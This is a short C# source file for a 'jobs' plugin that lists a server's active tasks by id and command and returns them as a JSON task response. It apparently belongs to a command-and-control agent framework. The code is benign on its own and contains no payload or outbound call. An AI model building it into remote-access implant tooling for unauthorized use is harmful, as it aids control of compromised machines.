using Workflow.Contracts;
using System.Text.Json;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "jobs";
        private IDataBroker messageManager { get; set; }

        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            Dictionary<string, ServerJob> jobs = messageManager.GetJobs();
            DebugLog.Log($"{Name} found {jobs.Count} active jobs [{job.task.id}]");
            Dictionary<string, string> jobsOut = jobs.ToDictionary(j => j.Value.task.id, j => j.Value.task.command);

            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = JsonSerializer.Serialize(jobsOut),
                completed = true
            });
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
